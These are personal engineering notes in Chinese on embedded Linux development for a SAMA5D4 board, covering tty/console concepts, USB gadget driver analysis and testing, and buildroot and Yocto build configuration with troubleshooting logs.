	    obj-$(CONFIG_ECAT_DRV) += ecat/  #打开下一级目录编译  
	    *  
	    *  
	4. 上层Kconfig
	    *  
	    *#添加下面这一句  
	    source "driver/xxx/ecat/Kconfig"  
	    #导入子文件夹中的Kconfig文件，可以为相对路径  
	    *  
	    *  
解决了:lcd 10分钟自动关屏幕问题!!
	推荐使用一个用户程序处理:
	display.c:
	#include <fcntl.h>
	#include <stdio.h>
	#include <sys/ioctl.h>
	int main(int argc ,char *argv[])
	{
	 int f0;
	 f0 = open("/dev/tty0", O_RDWR);
	 write(f0, "\033[9;0]", 8);
	 close(f0);
	 return 0;
	}
	arm-linux-gnueabihf-gcc -o display display.c //编译
	然后下载执行, 然后lcd的显示就又打开了!!!!
	如果要开机自动启动，复制到根目录后，在/etc/init.d/rcS里加上一句  /display
	详细原因见:http://blog.csdn.net/dongliqiang2006/article/details/4262950
	与console 和 tty 有巨大关联!!!
开发板的中断号与linux中断号的兑换表
	相关文件:linux-at91-master/drivers/irqchip/irq-atmel-aic5.c
	发现中断号 应该都在提取devicetree_node成platform_device_data时转换了










20170112
console 与 terminal 与 tty 重点!!
TTY:
	tty历史上是电传打字机的意思,后来是终端的意思!!
	(TTY)终端的概念: 一个提供输入和输出功能的实体硬件设备, 而且可以连接到电脑主机,与主机信息交互
		例如一台电脑的显示屏和键盘组合对于电脑主机来说这个组合是一个 TTY终端的硬件设备部分,
	业界把tty终端 可以连接到电脑主机,与主机信息交互 的部分抽象出来,就是没有实体硬件设备的终端,只有一个抽象接口
		当绑到一个实体硬件设备上的时候,这两者就成为一个真正意义上的终端
		然后操作硬件设备就相当于使用 终端 与 linux与电脑主机实现信息交互!!!
		每个终端每一时刻只能操作一个需要交互的用户程序!!
		这些 抽象接口 不严格意义上都可以统称 tty终端
	对于一台启动了的电脑!!
		我们常以为是运行在一个图形界面,
		实际上是:运行在 tty7终端上,而在这个终端上我们运行着一个大型的操作界面GUI程序而已!!
		在这里我们如果执行了一个 terminal程序,实际上是执行了一个 软件终端,
		透过这个软件,相当于我们在 tty7终端运行的大型软件 嵌套运行一个新的tty终端!!!		
	每一时刻只能操作一个需要交互的用户程序的概念例如:
		我们常常使用打开的terminal实际上就是一个终端软件,terminal窗口相当于输出端,硬件键盘就是输入端,
		terminal窗口和硬件键盘被这个 终端软件 打包模拟成一个实体硬件设备
		而这个硬件输入和输出功能的机器或机器组合,自动绑到一个抽象接口,即/dev/ttyX, 共同组合成一个真正意义上的终端
		通过这个接口,这个实体硬件设备 实现了与主机信息交互 的工作,
		也就是说 这个真正意义上的终端 实现了与主机信息交互 的工作
		在我们往 terminal 里 写执行命令时, 就相当于 通过通过终端往主机输入信息,
		主机把处理后的信息通过 /dev/ttyX 往terminal窗口送,便显示出来了
		在这样的交互过程中,我们只能一条条命令地输入执行,
		这就是每一时刻只能操作一个需要交互的用户程序的概念	
	理论上,各种类型实体硬件设备挂入 linux 都是注册一个终端设备,并生成绑定到对应的一个唯一的/dev/ttyXXX的字符设备文件,
		共同组合成一个含有输入和输出功能的硬件机器或机器组合,一个真正意义的终端!!
		例如著名的串口终端设备:
			/dev/ttyS0(对应通用标平台硬件0号口的串口终端设备) 
			/dev/ttySAC1(对应三星平台硬件1号口的串口终端设备)
			/dev/ttyACM4(对应at91平台硬件4号口的串口终端设备)
			/dev/ttyUSB0(对应通用标平台硬件0号口的usb串口终端设备)
		以上是一个硬件设备对照一个字符设备文件接口!!
		这些字符设备文件接口 俗称 串口终端设备
	然而,还有一种叫 虚拟终端设备 的概念: 
		有时希望第一终端正在执行一条漫长工作的指令,但是,又需要现在执行另一条指令,又不能停掉现在执行的那条,
		那么,我们就只能使用另外一个终端执行就可以了!!!
		因为一般实体硬件就只有一套,例如我们地脑的显示屏和键盘,那么,我们只需要把这套硬件绑到另外一个抽象接口,即另一个/dev/ttyX
		便可以得到一个新的终端,在这个终端里执行新的命令,
		虽然从旧的/dev/ttyX解绑出来,但是旧的终端并没有被关闭,只是被卸下实体硬件设备,旧的终端正在工作的命令还是在继续工作着,
		当我们把这套硬件绑回原来的抽象接口,就相当于给旧的终端装回硬件,转回到原来的终端上去!!!!
		这些抽象接口 /dev/ttyX 相当于没有硬件设备的终端, 俗称 虚拟终端设备 
		因为他们共用 显示屏和键盘 这套硬件设备!!!! 不像串口终端设备那样一对一的关系!!
console:	
	控制台终端,实际上是一个特殊终端!实际上他是基于 tty终端的,当把/dev/console映射到/dev/ttyXXX(例ttySAC0,tty0等等)时,
		实际上就是给普通的 tty终端 赋予了控制台的属性!!!,这个tty终端也就成了控制台终端!!
		控制台比tty终端多出来的属性是:(日志输出功能)可以显示printk内容!!!
	在移植内核时,我们写的bootargs里 有 console=tty0,console=ttyACM0 的内容就是说,tty0和ttyACM0 俩个tty终端赋予了控制台属性!!!
		但控制台终端只有一个!!!!
		这两个tty终端,会同时输出日志消息!!,即在tty0执行命令输出pingtk消息时,ttyACM0也会输出同样pintk消息
		但是,最后配置上控制台属性的 ttyACM0 才是一个实现基础的人机交互 的控制终端!!! 
			即例如开发板看到lcd屏显示,串口输出也有显示,但是,只能使用串口输入执行命令
			能用于人机交互的控制台,还有一个专有属性 就是提供用户登陆的功能!!
	控制台终端 与 普通的tty终端也就以上那点区别!!那么为啥还要另外弄一个控制台终端的概念?
		Linux kernel有一个很强烈的隐性规则----内核空间的代码不应该直接利用用户空间接口访问某些资源
		所以kernel的代码（如printk），就不能直接使用TTY的接口访问TTY设备
		kernel代码不应该直接使用文件系统接口访问文件（虽然它可以）
			TTY框架通过字符设备（也即文件系统）向用户空间提供接口
		console 是为此 开凿出来的后门.
伪终端 Pseudo Terminal，简称pty:
	并不是所有硬件设备都是通过串口的方式接入计算机开发板什么的,所以他们也不能简单地作为一个终端的输入输出功能的硬件
	相反,他们需要把自己的通讯方式模拟成串口硬件设备一样的,于是就出现了伪终端 pty 一般成对出现 pts ptm
	一般的:
		 硬件设备 接入 ttyX, ttyx与主机交互
	特殊的:
		特殊通讯协议硬件设备 接向 ptm, ptm与pts交互,  pts类似ttyx一样与主机交互
软件终端:
	我们平时 使用的的terminal,SecureCRT就是软件终端,
	但是也有区别:
		terminal: 
			把键盘输入功能和自身软件窗口输出功能打包模拟成一个串口硬件设备,或者其他特殊通讯协议的硬件设备
			然后 接入 一般的 /dev/ttyx 接口, ttyx与主机交互 组成一个真正的终端 			 
			或者其他特殊通讯协议的硬件设备
			通过伪终端方式 接入 ptm ptm又与专有pts交互,  pts类似ttyx一样与主机交互
		SecureCRT:
			模拟一个串口硬件设备接入到 开发板的 ttyX, ttyx与主机交互
最后,有一些未曾解决的疑问!!!
	kernal里配置 framebuffer_console 后, 开发板的串口和lcd都同时输出!!这是有两个console??
	当前可以进行人机交互的 tty终端,等同于console(控制台终端)么??
	我知道 tty0 永远是当前执行的终端,即电脑开机后,我是执行着 tty7的终端,而此刻的tty0就是tty7,
		而开机bootargs 里console=tty0, 就是说,当前不论执行在哪个tty终端都是console终端?
		唯有通过 terminal 执行的tty终端才可以不是console中端??








20170113
尝试使用官网的 连续buildroot一条龙工具链看看,
	$ git clone git://git.buildroot.net/buildroot     /* 下载buildroot 一条龙工具链  */
	$ git tag	/* 查看版本 */
	$ git checkout  2016.11-rc3 -b buildroot-2016.11-rc3	/* 选择 2016.11-rc3 这一版本 */
	$ make atmel_sama5d2_xplained_defconfig 	/* 建立一个配置,配置文件 XXX_defconfig 在 configs 文件夹可查看 */
	$ make		/* 开始一条龙编译, 最终所用生成文件放在 output/images里*/
	//开始刷写 flash
	$ ./board/atmel/flasher.sh ./output /dev/ttyACM1 sama5d4_xplained
	出错:
		couldn't load file "/tmp/tcloqFb5D": libXss.so.1: cannot open shared object file: No such file or directory
		couldn't load file "/tmp/tcl1oGOVF": libXft.so.2: cannot open shared object file: No such file or directory
	解决:
		sudo apt-get install libxss1:i386
		sudo apt-get install libxss1:i386
	继续出错:
		-I- Waiting ...
		-I- TCL platform : Linux
		-I- SAM-BA CDC 2.16  on : linux
		-I- Retrieved arguments from command line :
		-I- argv 0 : /dev/ttyACM1
		-I- argv 1 : at91sama5d4x-ek
		-I- argv 2 : ./board/atmel/nandflash.tcl
		-I- Connection /dev/ttyACM1
		-E- Connection /dev/ttyACM1 not found		//明明已经插好!!!使用新的sam-ba 3 可以链接!!
		-E- Connection list : 
	未解决:先搁置!!
尝试移植官方版 yocto_project:
	git clone 了 poky 的前三个软件包


偷闲分析usb驱动!
	drivers/usb/gadget/udc/atmel_usba_udc.c usb从设备驱动?就是把 开发板看做usb设备,而不是主机!!!








20170116
所谓usb_gaget 就是一个搭载linux工作的硬件设备,作为其他PC主机的 usb从设备,而需要用到的模块!!
usb_gaget驱动:
	基于底层提供的资源， Gadget 驱动可以运行在各种硬件平台上。重要的驱动有：
	Gadget Zero, 类似于 dummy hcd, 该驱动用于测试 udc 驱动。它会帮助您通过 USB-IF 测试。
	Ethernet over USB， 该驱动模拟以太网网口，它支持多种运行方式：
	CDC Ethernet: usb 规范规定的 Communications Device Class “Ethernet Model” protocol。
	CDC Subset： 对硬件要求最低的一种方式，主要是 Linux 主机支持该方式。
	RNDIS： 微软公司对 CDC Ethernet 的变种实现。
	File-backed Storage Gadget最常见的 U 盘功能实现。
	Serial Gadget 实现，包括：
	Generic Serial 实现（只需要Bulk-in/Bulk-out端点+ep0）
	CDC ACM 规范实现。
	Gadget Filesystem, 将 Gadget API 接口暴露给应用层，以便在应用层实现user mode driver。
	MIDI: 暴露ALSA接口，提供 recording 以及 playback 功能。
常见的 usb device 有 U 盘， usb 鼠标、键盘，usb 蓝牙模块，usb 读卡器，等等。这些设备比较简单，通常不会运行Linux。
	运行Linux Gadget 的通常是一些集成 CPU 以及很多外设接口的 SOC （System-on-Chip）， 
	其中 CPU 通常为 32 bit 的 CPU, 并且 udc 也是该 SOC 的一部分（ 顺带还有 DMA 通道，FIFO）。
观察:
  │ │                               --- USB Gadget Support                                                                                
  │ │                               [ ]   Debugging messages (DEVELOPMENT)                                                                
  │ │                               [ ]   Debugging information files (DEVELOPMENT)                                                       
  │ │                               [ ]   Debugging information files in debugfs (DEVELOPMENT)                                            
  │ │                               (2)   Maximum VBUS Power usage (2-500 mA)                                                             
  │ │                               (2)   Number of storage pipeline buffers                                                              
  │ │                                     USB Peripheral Controller  --->                                                                 
  │ │                               <M>   USB Gadget Drivers                                                                              
  │ │                               <M>     USB functions configurable through configfs                                                   
  │ │                               [ ]       Generic serial bulk in/out                                                                  
  │ │                               [*]       Abstract Control Model (CDC ACM)                                                            
  │ │                               [ ]       Object Exchange Model (CDC OBEX)                                                            
  │ │                               [ ]       Network Control Model (CDC NCM)                                                             
  │ │                               [ ]       Ethernet Control Model (CDC ECM)                                                           
  │ │                               [ ]       Ethernet Control Model (CDC ECM) subset     
  │ |                               [ ]       RNDIS                                                                                     
  │ │                               [ ]       Ethernet Emulation Model (EEM)                                                              
  │ │                               [*]       Mass storage                                                                                
.........                                                                      
  │ │                               < >     Gadget Zero (DEVELOPMENT)                                                                     
  │ │                               < >     Audio Gadget                                                                                  
  │ │                               < >     Ethernet Gadget (with CDC Ethernet support)                                                   
.......                                                                    
  │ │                               <M>     Mass Storage Gadget 
  │ │                               <M>     Serial Gadget (with CDC ACM and CDC OBEX support) 
得到的模块(gaget模块):
	libcomposite.ko
	u_serial.ko
	g_serial.ko
	usb_f_acm.ko
	usb_f_obex.ko
	usb_f_serial.ko
	g_mass_storage.ko
	atmel_usba_udc.ko
	usb_f_mass_storage.ko
从 Makefile 里得知:
	在function里编译得到的ko都是 接口中间模块,而在 legacy 里得到的ko都是真正的有实质工作的 上层usb从设备驱动
	中间模块;
		usb_f_acm.ko
		usb_f_obex.ko
		usb_f_serial.ko	
		u_serial.ko
		usb_f_mass_storage.ko
	实质从设备驱动:
		g_serial.ko
		g_mass_storage.ko
	gaget:udc控制器驱动:
		atmel_usba_udc.ko
	与复合usb从设备功能有关的中间模块:
		libcomposite.ko
学习到:
	acm 和 obex 都是特殊的串口通讯协议,serial才是传统的串口通讯协议
	所以 g_serial.ko 注册时,会选择其中一个通讯协议执行,
	也就是说 usb_f_acm.ko,usb_f_obex.ko, usb_f_serial.ko 三个挂载的中间模块中,我们会选择使用其中一个,
	这里 我们使用了usb_f_acm.ko
	发现,f_serial.c里的函数暂时也就只有f_serial.c自己调用!!很奇怪,作为一个中间模块.里面的函数绝对被放到指针里被调用了
如果项测试开发板的gaget串口功能!!可以这样:
	把编译好的内核烧入开发板，加载生成的驱动文件，注意加载顺序，否则会出现错误。
	先insmod atmel_usba_udc.ko  //添加 udc控制器驱动
	insmod  u_serial.ko
	insmod  libcomposite.ko
	insmod   usb_f_serial.ko	//atmel 选用acm协议，所以不用加载这个也可以
	insmod  usb_f_obex.ko		//atmel 选用acm协议，所以不用加载这个也可以
	insmod  usb_f_acm.ko
	insmod  g_serial.ko
	出现内核信息如下：
	[   27.310000] --------file=composite.c-------usb_composite_probe------1830
	[   27.320000] ------------402
	[   27.320000] -----usb_gadget_probe_driver------411
	[   27.330000] -------udc_bind_to_driver-----342
	[   27.330000] g_serial gadget: Gadget Serial v2.4
	[   27.340000] g_serial gadget: g_serial ready
	[   18.960000] g_serial gadget: high-speed config #2: CDC ACM config
	说明加载成功。
	此时你打开 win7 设备管理器会发现多了一个串口设备，
	ELMO GMAS（COM10）
	(未测试!!)
测试:
	本想安装上述.ko 但发现其实都已经=安装,表示有一shell文件,自动把这些.ko都安装上了!!!!
	在这里,由于 usba 口 本来就接上电脑了
	所以,其实gaget 实际上已经工作了,
	然而,以下的初始化顺序还是很模糊!!!
		假如 insmod g_serial.ko 后,就认为gaget已工作?,就已经建立了 /dev/ttyGS0 ??,还是插线材后??
		pc(ubuntu)上,出现了 ttyACM1符号,显然是 由gaget 这方提供的信息,让pc机初始化的,但未见是gaget的哪部分初始化代码实现
	pc机 打开 ttyACM1 串口终端,往里写数据
	开发板 cat /dev/ttyGS0 监听到数据!!!
	注意:g_serial.ko 是 gaget 串口上层模块,通俗是我们常叫做的 usb串口驱动 (从设备端的!!)
卸载串口驱动,重新加载	
	# rmmod g_serial.ko 
	# insmod g_serial.ko
	g_serial gadget: Gadget Serial v2.4
	g_serial gadget: g_serial ready
	插入usb线到 usba口
	g_serial gadget: high-speed config #2: CDC ACM config	//插入出现的log!!!
	然后又可以观察串口工作:
	pc机 打开 ttyACM1 串口终端,往里写数据
	开发板 cat /dev/ttyGS0 监听到数据!!!
gaget作为u盘设备测试!!
	先安装两个模块:
		//libcomposite.ko, atmel_usba_udc.ko 两个模块 开示时已安装!!!
		# insmod usb_f_mass_storage.ko	//中间模块!!!
		# insmod g_mass_storage.ko	//u盘驱动 然而安装失败
		由于 gaget_usb控制器atmel_usba_udc 已经被作为串口占用了,出现这样错误!!
		insmod: ERROR: could not insert module g_mass_storage.ko: No such device
		# rmmod g_serial.ko //先卸载 usb 串口驱动
		//然而先不要 再次加载 u盘驱动!!
		//如果执行insmod g_mass_storage.ko还是会出错,从错误信息中发现,加载时需要写入参数的
		//Number of LUNs=8
		//Mass Storage Function, version: 2009/09/11
		//LUN: removable file: (no medium)
		//Number of LUNs=1
		//no file given for LUN0
		//g_mass_storage 400000.gadget: failed to start g_mass_storage: -22
	在加载u盘驱动前,先在 开发板 分配一个空间为u盘所用!!!! 
   		# dd if=/dev/zero of=vfat.img bs=1M count=20	//制作一个fat格式的镜像 1M*20=20M大小的 文件，
		20+0 records in
		20+0 records out
		20971520 bytes (21 MB) copied, 0.177479 s, 118 MB/s
   		# losetup /dev/loop0 vfat.img			//将镜像与loop0建立连接
    		# mkfs.vfat /dev/loop0				//格式化做出的镜像
		mkfs.fat 3.0.28 (2015-05-16)
		Loop device does not match a floppy size, using default hd params
    		# mkdir vfat_mount_point				//创建挂载点
    		# mount /dev/loop0 vfat_mount_point/   		//挂载挂载点
    		# insmod g_mass_storage.ko file=/dev/loop0 stall=0 removable=1     //这才是加载u盘驱动的真正方式
		g_mass_storage: unknown parameter 'removeble' ignored
		Number of LUNs=8
		Mass Storage Function, version: 2009/09/11
		LUN: removable file: (no medium)
		Number of LUNs=1
		LUN: file: /dev/loop0
		Number of LUNs=1
		g_mass_storage gadget: Mass Storage Gadget, version: 2009/09/11
		g_mass_storage gadget: userspace failed to provide iSerialNumber
		g_mass_storage gadget: g_mass_storage ready
		g_mass_storage gadget: high-speed config #1: Linux File-Backed Storage   //注意这句 是在usba口经usb线接到pc机时出现,
    		插上开发板的usb从接口，即可从PC机段看到vfat_mount_point下的内容,
		pc机可以刷写内容到里面!! 开发板来到vfat_mount_point 可以看到刷入数据
		开发板往里写内容,pc机可见!!!!!
测试总结:
	显然如果不加载 g_XXX.ko 插入usb线并没有信息输出,gaget功能并不会实现!!!!
	初步分析,当usb插入时,才会调用 struct usb_composite_driver里的 .bind 函数!!
gaget 串口例程分析:
	legacy: serial.c 将编译成上层实质从设备驱动模块 g_serial.ko:
	(感觉这不是一个热插拔自动加载的驱动,手动加载后,就自动存在 并存在建立好的 /dev逻辑设备文件,不管此刻是否接上usb!!)
	serial.c 初始化 :
		static struct usb_composite_driver gserial_driver = {
		.name		= "g_serial",
		.dev		= &device_desc,
		.strings	= dev_strings,
		.max_speed	= USB_SPEED_SUPER,
		.bind		= gs_bind,
		.unbind		= gs_unbind,
		};
		struct usb_configuration serial_config_driver;
		serial_config_driver.bmAttributes = USB_CONFIG_ATT_SELFPOWER;
		serial_config_driver.label = "Generic Serial config";
		serial_config_driver.bConfigurationValue = 1;
		struct usb_device_descriptor device_desc;
		device_desc.bDeviceClass = USB_CLASS_VENDOR_SPEC;
		device_desc.idProduct =	cpu_to_le16(GS_PRODUCT_ID);
		static struct usb_string strings_dev[];
		strings_dev[STRING_DESCRIPTION_IDX].s = serial_config_driver.label;
		usb_composite_probe(&gserial_driver);			//composite.c
			struct usb_composite_driver *driver = &gserial_driver;
			struct usb_gadget_driver *gadget_driver;
			static const struct usb_gadget_driver composite_driver_template = {
				.bind		= composite_bind,
				.unbind		= composite_unbind,
				.setup		= composite_setup,
				.reset		= composite_disconnect,
				.disconnect	= composite_disconnect,
				.suspend	= composite_suspend,
				.resume		= composite_resume,
				.driver	= {
					.owner		= THIS_MODULE,
					},
				};	
			driver->gadget_driver = composite_driver_template;
			gadget_driver = &driver->gadget_driver;
			gadget_driver->function =  (char *) driver->name;
			gadget_driver->driver.name = driver->name;
			gadget_driver->max_speed = driver->max_speed;
			usb_gadget_probe_driver(gadget_driver);			//udc_core.c
				struct usb_gadget_driver *driver = gadget_driver
				list_for_each_entry(udc, &udc_list, list)
				(	if (!udc->driver)	//如果udc里没有驱动
						goto found;	//即udc_bind_to_driver(udc, driver);	
				}
				udc_bind_to_driver(udc, driver);			
					struct usb_udc *udc = udc 
					struct usb_gadget_driver *driver = driver
					struct usb_udc {		//udc_core.c
						struct usb_gadget_driver	*driver;
						struct usb_gadget		*gadget;
						struct device			dev;
						struct list_head		list;
						bool				vbus;
					};
 					udc->driver = driver;
					udc->dev.driver = &driver->driver;
					udc->gadget->dev.driver = &driver->driver;
					ret = driver->bind(udc->gadget, driver);//这里的bind是 composite_bind
						//然后转到 gs_bind 函数
					ret = usb_gadget_udc_start(udc);
						//这里执行的 ops.udc_start 应该就是 atmel_usba_udc 的这个udc驱动
					usb_udc_connect_control(udc);
						//Enables the D+ (or potentially D-) pullup
					kobject_uevent(&udc->dev.kobj, KOBJ_CHANGE);
						//通知了用户空间,注意只是通知了 atmel_usba_udc 驱动得变化,
						//并不是通知发生了热插拔事件!!!
关于 uevent:
	uevent(user space event) 内核与用户空间的一种通信机制，基于netlink机制，主要用于设备驱动模型，例如热插拔
		也就是说在某个时刻触发某个事件并通知给用户空间。
	事件：
		enum kobject_action {
		 KOBJ_ADD,
		 KOBJ_REMOVE,
		 KOBJ_CHANGE,
		 KOBJ_MOVE,
		 KOBJ_ONLINE,
		 KOBJ_OFFLINE,
		 KOBJ_MAX
		};
	触发点 kobject_uevent() :
 		如device_add()中的触发：
			kobject_uevent(&dev->kobj, KOBJ_ADD);
 		在kobject_uevent()中会先执行集成在kset中的kset_uevent_ops, 之后再通过netlink传递给用户空间。
 		struct kset_uevent_ops {
		 int (* const filter)(struct kset *kset, struct kobject *kobj);
		 const char *(* const name)(struct kset *kset, struct kobject *kobj);
		 int (* const uevent)(struct kset *kset, struct kobject *kobj,
		        struct kobj_uevent_env *env);
		};
 		filter用于判断uevent是否要发出去，name用于得到subsystem的名字，uevent用于填充env变量。
 		我们可以看到kobject_uevent()中的代码： 
			 if (uevent_ops && uevent_ops->filter)
			  if (!uevent_ops->filter(kset, kobj)) {
			       ......
			  }
			 /* originating subsystem */
			 if (uevent_ops && uevent_ops->name) {
			  subsystem = uevent_ops->name(kset, kobj);
			  ......
			 }
			  ......
			 /* let the kset specific function add its stuff */
			 if (uevent_ops && uevent_ops->uevent) {
			  retval = uevent_ops->uevent(kset, kobj, env);
			    ......
			 }
 		最后调用netlink接口发送出去，用户层会根据所设置的env变量来启动相应操作，至于env变量设置内容暂时不深究。
	当 kobject_uevent() 把内容通知到了用户空间后,用户空间的处理!! 
 		uevent的用户空间程序有两个，一个是udev，一个是mdev。
 		udev通过netlink监听uevent消息，它能完成两个功能：
 		      1．自动加载模块
 		      2．根据uevent消息在dev目录下添加、删除设备节点。
		另一个是mdev，mdev在busybox的代码包中能找到，它通过上节提到的uevent_helper函数被调用。
		udev的模块自动加载过程：
 			etc目录下有一个uevent规则文件/etc/udev/rules.d/50-udev.rules
			udev程序收到uevent消息后，在这个规则文件里匹配，如果匹配成功，则执行这个匹配定义的shell命令。
			例如，规则文件里有这么一行：
			ACTION=="add", SUBSYSTEM=="?*", ENV{MODALIAS}=="?*", RUN+="/sbin/modprobe $env{MODALIAS}"
			所以，当收到uevent的add事件后，shell能自动加载在MODALIAS中定义的模块。	
		mdev的模块自动加载过程与之类似，它的配置文件在/etc/mdev.conf中。例如：
			$MODALIAS=.* 0:0 660 @modprobe "$MODALIAS"
		git a	这条规则指的是：当收到的环境变量中含有MODALIAS，那么加载MODALIAS代表的模块。
			mdev的详细说明在busybox的docs/mdev.txt中。
关于 OTG
	OTG 是 usb 的一个通用标准功能!! USB硬件内部有一条 动态的ID线
	当我们配置使用 OTG 功能, usb控制器驱动就会多了一个工作,监测当前usb口连接的状态,
	当检测到 ID线接地 这个usb口会作为host口,这台设备工作在usb 的主机模式,并不会工作在usb 从机模式,即不会使用 gaget 的驱动
	当检测到 ID线悬空 这个usb口会作为slave口,这台设备作为usb从设备,会使用 gaget 的驱动 执行工作!!!
	这个动态id线 通过 刷写 寄存器 改变状态!!
github常用命令:
平时提交!!
git add -A	//把所有修改了的文件和新建的文件的痕迹加入暂存区,相当于全员备份
git add modules/*	// */  把modules整个文件夹及其内容载入暂存区
git commit -m "xxx"	//提交
git push origin master	//提交远程库
git rm --cached tools/qt/qt-everywhere-opensource-src-5.6.0-rc.tar.gz	//移除多余错误添加git add 到index缓存的文件
git reset --soft HEAD^	//软回溯到上个版版本,即上个版本还没有git commit 的状态














20170117
编译 yocto project:
先建立一个总文件夹 我直接设了一个poky文件夹 cd Poky
	git clone git://git.yoctoproject.org/poky -b krogoth	/* 下载 yocto project 总工具链 */
	git clone git://git.openembedded.org/meta-openembedded -b krogoth	/* 下载 meta-openembedded 包 */
	git clone git://github.com/meta-qt5/meta-qt5.git -b krogoth	/* 下载 meta-qt5 包 */
	git clone git://github.com/linux4sam/meta-atmel.git -b krogoth	/* 下载 meta-atmel 包 */
	备份!!4个包!! 出Poky文件夹, 另建 Poky_backup 保存git clone下来的四个工具包
然后继续: 
	cd poky
	source oe-init-build-env build-atmel	//建立了编译工作文件夹 bulid-atmel 拷贝了通用配置到里面,并自动 cd 到 build-atmel 文件夹
	gedit conf/bblayers.conf	//修改 ./build-amel/conf/bblayers.conf 文件	
/* build-amel/conf/bblayers.conf: start */
# POKY_BBLAYERS_CONF_VERSION is increased each time build/conf/bblayers.conf
# changes incompatibly
POKY_BBLAYERS_CONF_VERSION = "2"
BBPATH = "${TOPDIR}"
BBFILES ?= ""
# 官方建议的BSPDIR ,但使用时出现大量 checksum错误 ,和文件无法找到的错误
# BSPDIR := "${@os.path.abspath(os.path.dirname(d.getVar('FILE', True)) + '/../../..')}"
# by willam 所以最好改为静态路径
BSPDIR := "/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky"
BBLAYERS ?= " \
  ${BSPDIR}/poky/meta \
  ${BSPDIR}/poky/meta-poky \
  ${BSPDIR}/poky/meta-yocto-bsp \
  ${BSPDIR}/meta-atmel \
  ${BSPDIR}/meta-openembedded/meta-oe \
  ${BSPDIR}/meta-openembedded/meta-networking \
  ${BSPDIR}/meta-openembedded/meta-python \
  ${BSPDIR}/meta-openembedded/meta-ruby \
  ${BSPDIR}/meta-openembedded/meta-multimedia \
  ${BSPDIR}/meta-qt5 \
  "
BBLAYERS_NON_REMOVABLE ?= " \
  ${BSPDIR}/poky/meta \
  ${BSPDIR}/poky/meta-poky \
  "
/* build-amel/conf/bblayers.conf: end */

	gedit conf/local.conf //继续 修改 ./build-amel/conf/local.conf 文件

/* build-amel/conf/local.conf: start */
...
#by william	
MACHINE ?= "sama5d4-xplained"
...
# 还是用回 默认路径,因为这样,似乎不会出现 checksum 和 文件 not found 错误
# 这里是指定一个下载的库文件要寄放的文件夹!!
DL_DIR ?= "${TOPDIR}/downloads"		
#by william
# DL_DIR ?= "/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky"
....
#by william 符合 atmel 官方的policy configure
DISTRO = "poky-atmel"
....
#
# Package Management configuration
#
# This variable lists which packaging formats to enable. Multiple package backends
# can be enabled at once and the first item listed in the variable will be used
# to generate the root filesystems.
# Options are:
#  - 'package_deb' for debian style deb files
#  - 'package_ipk' for ipk files are used by opkg (a debian style embedded package manager)
#  - 'package_rpm' for rpm style packages
# E.g.: PACKAGE_CLASSES ?= "package_rpm package_deb package_ipk"
#by william Package Management configuration 使用默认使用 ipk 格式包 
PACKAGE_CLASSES ?= "package_ipk"
....
# We default to enabling the debugging tweaks.
EXTRA_IMAGE_FEATURES ?= "debug-tweaks"
....
#by william  未知有何用,,
USER_CLASSES ?= "buildstats image-mklibs"
....
# Runtime testing of images
PATCHRESOLVE = "noop"
....
# Disk Space Monitoring during the build
BB_DISKMON_DIRS = "\
    STOPTASKS,${TMPDIR},1G,100K \
    STOPTASKS,${DL_DIR},1G,100K \
    STOPTASKS,${SSTATE_DIR},1G,100K \
    STOPTASKS,/tmp,100M,100K \
    ABORT,${TMPDIR},100M,1K \
    ABORT,${DL_DIR},100M,1K \
    ABORT,${SSTATE_DIR},100M,1K \
    ABORT,/tmp,10M,1K"
.....
# Qemu configuration
PACKAGECONFIG_append_pn-qemu-native = " sdl"
PACKAGECONFIG_append_pn-nativesdk-qemu = " sdl"
....
CONF_VERSION = "1"
/* build-amel/conf/local.conf: end */
	
	bitbake core-image-minimal
		ERROR:  OE-core's config sanity checker detected a potential misconfiguration.
		    Either fix the cause of this error or at your own risk disable the checker (see sanity.conf).
		    Following is the list of potential problems / advisories:

		    Please install the following missing utilities: makeinfo,gawk,chrpath

		Summary: There was 1 ERROR message shown, returning a non-zero exit code.
		解决1:
		sudo apt-get install makeinfo gawk chrpath
			没有makeinfo 其实装的是texinfo 非makeinfo
		解决2:
		sudo apt-get install texinfo gawk chrpath
	再次: bitbake core-image-minimal
		WARNING: /home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky/poky/meta/recipes-bsp/grub/grub-efi_2.00.bb: 
		Unable to get checksum for grub-efi-native SRC_URI entry cfg: file could not be found
		...
		解决:
		之前的 bblayers.conf: BSPDIR 改为:
			BSPDIR := "/home/infortech-ubuntu-1404/SAMA5D4/sources/Yocto_project/Poky"
		仍然 warning
		把 local.conf:DL_DIR 改回与来的 :
			DL_DIR ?= "${TOPDIR}/downloads" 就是说说编译过程中要下载的文件放入 build-atmel/downloads
		居然好了
	再次: bitbake core-image-minimal 几乎用了15小时, 还从网上下载了 25 G 内容!!!!!
		但是还是有错!!!! 具体 log;
/* 编译log?: start */ 
infortech-ubuntu-1404@infortechubuntu1404-HP-EliteDesk-880-G2-TWR:~/SAMA5D4/sources/Yocto_project/Poky/poky/build-atmel$ bitbake core-image-minimal
Parsing recipes: 100% |###################################################################################################################################| Time: 00:00:30
Parsing of 1934 .bb files complete (0 cached, 1934 parsed). 2490 targets, 379 skipped, 0 masked, 0 errors.
NOTE: Resolving any missing task queue dependencies

Build Configuration:
BB_VERSION        = "1.30.0"
BUILD_SYS         = "x86_64-linux"
NATIVELSBSTRING   = "Ubuntu-14.04"
TARGET_SYS        = "arm-poky-linux-gnueabi"
MACHINE           = "sama5d4-xplained"
DISTRO            = "poky-atmel"
DISTRO_VERSION    = "2.1.2"
TUNE_FEATURES     = "arm armv7a vfp thumb neon       callconvention-hard       cortexa5"
TARGET_FPU        = "hard"
meta              
meta-poky         
meta-yocto-bsp    = "krogoth:ae9b341ecfcc60e970f29cfe04306411ad26c0cf"
meta-atmel        = "krogoth:c415e7330e6fd92e860423d144d6c98bf20c8887"
meta-oe           
meta-networking   
meta-python       
meta-ruby         
meta-multimedia   = "krogoth:55c8a76da5dc099a7bc3838495c672140cedb78e"
meta-qt5          = "krogoth:2b1871f0d139dc3caaa779a32a1931409c245a36"

NOTE: Fetching uninative binary shim from http://downloads.yoctoproject.org/releases/uninative/1.0.1/x86_64-nativesdk-libc.tar.bz2;sha256sum=acf1e44a0ac2e855e81da6426197d36358bf7b4e88e552ef933128498c8910f8
NOTE: Preparing RunQueue
NOTE: Executing SetScene Tasks
NOTE: Executing RunQueue Tasks
